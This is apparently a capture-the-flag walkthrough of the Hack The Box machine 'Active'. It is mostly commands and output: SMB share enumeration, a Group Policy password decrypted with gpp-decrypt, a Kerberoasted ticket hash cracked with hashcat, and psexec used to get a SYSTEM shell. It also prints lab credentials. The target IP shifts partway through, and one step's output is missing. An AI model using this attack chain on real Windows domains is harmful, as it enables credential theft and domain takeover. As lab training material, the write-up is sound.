nmap -sC -sV -A -T4 10.129.186.200 -oN nmap.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-07 20:29 IST
Nmap scan report for 10.129.186.200
Host is up (0.16s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-07 15:00:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/7%OT=53%CT=1%CU=33667%PV=Y%DS=2%DC=T%G=Y%TM=61AF775
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M5
OS:4DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-12-07T15:01:32
|_  start_date: 2021-12-07T14:59:26
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
|_clock-skew: 2s

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   179.28 ms 10.10.14.1
2   179.35 ms 10.129.186.200

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.34 seconds




nslookup       
> server 10.129.186.200
Default server: 10.129.186.200
Address: 10.129.186.200#53
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost.
> 10.129.186.200
;; connection timed out; no servers could be reached




SMB - TCP 139/445
SMB Enumeration
nmap --script safe -p 445 10.129.186.200 -oN smbnmap
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-07 20:48 IST
Pre-scan script results:
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_eap-info: please specify an interface with -e
| broadcast-listener: 
|   ether
|       ARP Request
|         sender ip    sender mac         target ip
|         192.168.1.1  14:a7:2b:27:56:d5  192.168.1.5
|   udp
|       SSDP
|         ip           uri
|         192.168.1.2   urn:dial-multiscreen-org:service:dial:1
|       DHCP
|         srv ip       cli ip       mask           gw           dns               vendor
|         192.168.1.1  192.168.1.5  255.255.255.0  192.168.1.1  8.8.8.8, 4.2.2.2  -
|_        192.168.1.1  192.168.1.4  255.255.255.0  192.168.1.1  8.8.8.8, 4.2.2.2  -
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_broadcast-pppoe-discover: ERROR: Script execution failed (use -d to debug)
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     Interface: wlan0
|     IP Offered: 192.168.1.5
|     Server Identifier: 192.168.1.1
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|_    Domain Name Server: 8.8.8.8, 4.2.2.2
| broadcast-igmp-discovery: 
|   192.168.1.1
|     Interface: wlan0
|     Version: 2
|     Group: 224.0.0.2
|     Description: All Routers on this Subnet
|   192.168.1.1
|     Interface: wlan0
|     Version: 2
|     Group: 224.0.0.22
|     Description: IGMP
|   192.168.1.1
|     Interface: wlan0
|     Version: 2
|     Group: 239.255.255.250
|     Description: Organization-Local Scope (rfc2365)
|_  Use the newtargets script-arg to add the results as targets
| broadcast-upnp-info: 
|   239.255.255.250
|       Server: OS 1.0 UPnP/1.0 Realtek/V1.0
|_      Location: http://192.168.1.1:52881/simplecfg.xml
Nmap scan report for active.htb (10.129.186.200)
Host is up (0.19s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| unusual-port: 
|_  WARNING: this script depends on Nmap's service/version detection (-sV)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-12-07T15:19:29
|_  start_date: 2021-12-07T14:59:26
| dns-blacklist: 
|   SPAM
|_    l2.apews.org - FAIL
|_fcrdns: FAIL (No PTR record)
|_msrpc-enum: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-capabilities: 
|   2.0.2: 
|     Distributed File System
|   2.1: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb-protocols: 
|   dialects: 
|     2.0.2
|_    2.1
|_clock-skew: 2s
|_ipidseq: ERROR: Script execution failed (use -d to debug)
|_path-mtu: PMTU == 1500
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| port-states: 
|   tcp: 
|_    open: 445

Post-scan script results:
| reverse-index: 
|_  445/tcp: 10.129.186.200
Nmap done: 1 IP address (1 host up) scanned in 62.83 seconds


Given this is a Windows host, I’ll take a look at SMB. Enumerating SMB has always been something that I had to use a bunch of tools in what felt like imperfect ways. I had even written a post on the various tools for enumerating smb . Then IppSec tipped me off to smbmap. I had just finished this post, but (after updating the SMB enumeration checklist), I went back in to add how smbmap works as well at a couple steps.
List Shares

I originally solved this with enum4linux, but the problem with that tool is that it just dumps a bunch of information, and a lot of it seems like failures much of the time. Understanding what comes back can be difficult. Here’s the section of the output that was useful here

smbclient -L//10.129.186.200
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.186.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                            
┌──(root💀sac)-[~/Downloads/hackthebox/Active]
└─# enum4linux 10.129.186.200
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec  7 20:53:23 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.129.186.200
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 10.129.186.200    |
 ====================================================== 
[E] Can't find workgroup/domain


 ============================================== 
|    Nbtstat Information for 10.129.186.200    |
 ============================================== 
Looking up status of 10.129.186.200
No reply from 10.129.186.200

 ======================================= 
|    Session Check on 10.129.186.200    |
 ======================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.129.186.200 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ============================================= 
|    Getting domain SID for 10.129.186.200    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on 10.129.186.200    |
 ======================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.129.186.200 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.129.186.200 from srvinfo:
        10.129.186.200 Wk Sv PDC Tim NT     Domain Controller
        platform_id     :       500
        os version      :       6.1
        server type     :       0x80102b

 =============================== 
|    Users on 10.129.186.200    |
 =============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 =========================================== 
|    Share Enumeration on 10.129.186.200    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.129.186.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      



GPP Passwords

Whenever a new Group Policy Preference (GPP) is created, there’s an xml file created in the SYSVOL share with that config data, including any passwords associated with the GPP. For security, Microsoft AES encrypts the password before it’s stored as cpassword. But then Microsoft published the key on MSDN!

Microsoft issued a patch in 2014 that prevented admins from putting passwords into GPP. But that patch doesn’t do anything about any of these breakable passwords that were already there, and from what I understand, pentesters still find these regularly in 2018. For more details, check out this AD Security post.
Decrypting GPP Password

Since the key is known, I can decrypt the password. Kali has a tool called gpp-decrypt that will do it:
┌──(root💀sac)-[~/Downloads/hackthebox/Active]
└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                                                                                                               137 ⨯
GPPstillStandingStrong2k18


smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    NO ACCESS
        NETLOGON                                                READ ONLY
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY
        Users                                                   READ ONLY


When I connect to the Users share, it looks like the C:\users\ directory,

smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18                                                                                                         
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                         DHS        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                      DHS        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                10459647 blocks of size 4096. 6308502 blocks available


Kerberoasting
Background

Kerberos is a protocol for authentication used in Windows Active Directory environments (though it can be used for auth to Linux hosts as well). In 2014, Tim Medin presented an attack on Kerberos he called Kerberoasting. It’s worth reading through the presentation, as Tim uses good graphics to illustrate the process, but I’ll try to give a simple overview.

When you want to authenticate to some service using Kerberos, you contact the DC and tell it to which system service you want to authenticate. It encrypts a response to you with the service user’s password hash. You send that response to the service, which can decrypt it with it’s password, check who you are, and decide it if wants to let you in.

In a Kerberoasting attack, rather than sending the encrypted ticket from the DC to the service, you will use off-line brute force to crack the password associated with the service.

Most of the time you will need an active account on the domain in order to initial Kerberoast, but if the DC is configured with UserAccountControl setting “Do not require Kerberos preauthentication” enabled, it is possible to request and receive a ticket to crack without a valid account on the domain.
Get Hash

I’ll use the GetUserSPNs.py script from Impacket to get a list of service usernames which are associated with normal user accounts. It will also get a ticket that I can crack.

The script identified a user, Administrator:

Decrypt with Hashcat

I’ll look up the hash type here, and then crack it with hashcat:
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt


$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9
184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a
994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0b
ea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa
7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d
937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7
532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952
d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b
94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550de
cb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2c
ec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174:Ticketmaster1968


smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  READ, WRITE
        C$                                                      READ, WRITE
        IPC$                                                    NO ACCESS
        NETLOGON                                                READ, WRITE
        Replication                                             READ ONLY
        SYSVOL                                                  READ, WRITE
        [!] Unable to remove test directory at \\10.10.10.100\SYSVOL\vnCfhEJMWA, plreae remove manually
        Users                                                   READ ONLY


System Shell

But of course I want to get a shell. Now that the shares are writable and I have administrator access, I can get a shell with PSExec. There’s a bunch of ways to do this directly from Kali. Sticking with the Impacket tools, I’ll use psexec.py:

┌──(root💀sac)-[~/Downloads/hackthebox/Active]
└─# cp /usr/share/doc/python3-impacket/examples/psexec.py .
                                                                                                                                                                                            
┌──(root💀sac)-[~/Downloads/hackthebox/Active]
└─# python3 psexec.py active.htb/administrator@10.129.186.200
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.186.200.....
[*] Found writable share ADMIN$
[*] Uploading file apEjGEsd.exe
[*] Opening SVCManager on 10.129.186.200.....
[*] Creating service KAgX on 10.129.186.200.....
[*] Starting service KAgX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
